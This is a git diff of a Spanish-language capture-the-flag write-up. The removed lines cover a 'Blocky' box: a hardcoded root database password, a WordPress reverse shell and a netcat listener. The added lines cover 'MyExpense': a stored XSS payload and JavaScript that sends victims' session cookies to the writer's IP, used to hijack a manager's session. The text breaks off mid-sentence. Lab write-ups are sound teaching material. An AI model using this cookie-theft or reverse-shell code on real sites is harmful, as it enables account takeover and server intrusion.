@@ -152,57 +152,39 @@ En un momento dado, vemos que hemos recibido una petición *GET* del recurso ```
 
 ![](/assets/images/vh-writeup-myexpense/slamotte.png)
 
+Una vez como slamotte, podemos ver una especie de chat donde varios usuarios han escrito mensajes. 
 
-Descarguémonos los plugins para ver que contienen. Como .jar es una extensión de un archivo comprimido los descomprimimos con ```unzip [nombre del archivo]```. 
-Una vez hecho esto nos centraremos en el plugin *BlockyCore.class* que se encuentra dentro de la carpeta ```com->myfirstpuglin```.
+Si nos vamos al apartado del perfil, podemos ver quién es nuestro mánager: Manon Riviere (mriviere)
 
-Con ```javap -c BlockyCore.class``` diseccionamos el código y encontramos lo siguiente:
+![](/assets/images/vh-writeup-myexpense/whoisManager.png)
 
-```bash
-public com.myfirstplugin.BlockyCore();
-    Code:
-       0: aload_0
-       1: invokespecial #12                 // Method java/lang/Object."<init>":()V
-       4: aload_0
-       5: ldc           #14                 // String localhost
-       7: putfield      #16                 // Field sqlHost:Ljava/lang/String;
-      10: aload_0
-      11: ldc           #18                 // String root
-      13: putfield      #20                 // Field sqlUser:Ljava/lang/String;
-      16: aload_0
-      17: ldc           #22                 // String 8YsqfCTnvxAUeduzjNSXe22
-      19: putfield      #24                 // Field sqlPass:Ljava/lang/String;
+Si alguien tiene que tramitar nuestro pago, por lógica tiene que ser él. Por lo tanto tenemos que ver la forma de que nos acepte el pago.
+
+Si intentamos inyectar html en el chat, podremos observar que se produce un *XSS*. La idea aquí será robar las cookie de sesión de la persona que vea el mensaje y probar suerte de que mriviere caiga en nuestra trampa.
+
+Para ello referenciaré un script en *js* llamado ```stealCookie.js```:
+
+```html
+<script src="http://<mi ip>/stealCookie.js"></script>
 ```
 
-Como podemos observar, hay credenciales para el usuario root de lo que sería problamente el phpmyadmin que encontramos cuando fuzzeamos. Las probamos y entramos como root.
-
-![](/assets/images/htb-writeup-blocky/phpmyadmin-login.PNG)
-
-Una vez dentro, como hemos entrado con permisos de administrador, podemos modificar la contraseña de wordpress del usuario notch.
-
-![](/assets/images/htb-writeup-blocky/phpmyadmin-change1.PNG)
-
-![](/assets/images/htb-writeup-blocky/phpmyadmin-change2.PNG)
-
-Ahora entramos en wordpress como usuario administrador y hacemos una reverse shell. Para ello nos dirigimos a ```Appearance->Editor``` y modificamos la plantilla 404.php.
-
-![](/assets/images/htb-writeup-blocky/wp-login_reverse_shell.PNG)
-
-En ella pegamos este <a href="https://github.com/jivoi/pentest/blob/master/shell/rshell.php" target="_blank">script de reverse shell</a>.
-
-Editamos la ip y el puerto en el script, además de ponernos en escucha desde nuestro ordenador de atacante:
-
-```bash
-nc -nlvp 443 
+stealCookie.js:
+```js
+var request = new XMLHttpRequest();
+request.open('GET', 'http://<mi ip>:4646/cookie=' + document.cookie);
+request.send();
 ```
-En mi caso me he puesto en escucha por el puerto 443. Ahora, abrimos la página web por la ruta [IP]/?p=404.php para que nos apunte a nuestro código php malicioso. Esto nos mandará una shell a nuestro netcat dandónos acceso al servidor como el usuario www-data.
 
+En este código, se tramita una petición *GET* a nuestra ip con un parámetro llamado cookie donde irá la cookie de la víctima que ejecute este *js*.
 
-<a id="escalada"></a>
+> Como se puede observar, esta vez uso el puerto 4646. Esto se debe a que el usuario administrador que visita continuamente a la página ```admin/admin.php``` que nos activó la cuenta de slamotte está continuamente haciendo una petición a nuestro puerto 80. Así que por simplificación usaremos otro puerto.
 
-## Escalada de privilegios
+Una vez hecho esto, obtendremos una serie de cookies de diferentes usuarios. Iremos probando una a una hasta dar con **mriviere**.
 
-A estas alturas del ataque deberíamos de hacer un reconocimiento del sistema buscando potenciales vectores de ataque como las capabilities o los archivos SUID. No obstante, la solución es mucho más sencilla que eso. Si utilizamos la contraseña de phpmyadmin para convertirte en notch (```su notch```), nos damos cuenta de que es la misma. Como notch es un sudoer podemos hacer ```sudo su``` y con la contraseña de notch nos convertimos en root.
+![](/assets/images/vh-writeup-myexpense/mriviereReport.png)
 
+Aquí podemos ver la petición del pago y le damos a aceptar. Pero esto no es suficiente, todavía lo tiene que revisar el superior de este usuario. Si nos vamos a su usuario lo encontraremos:
 
-Evidentemente hay muchas maneras distintas de comprometer un servidor, en este caso por ejemplo podríamos haber intentado un *ssh* con el usuario notch y la contraseña de phpmyadmin e igualmente hubieramos entrado al sistema. De todas formas esta es la forma que encuentro más coherente de operar.
+![](/assets/images/vh-writeup-myexpense/whoisManagerOfManager.png)
+
+En las cookies anteriores se encuentra este usuario. Sin embargo, como es un administrador, aparece una alerta de que no pueden haber dos
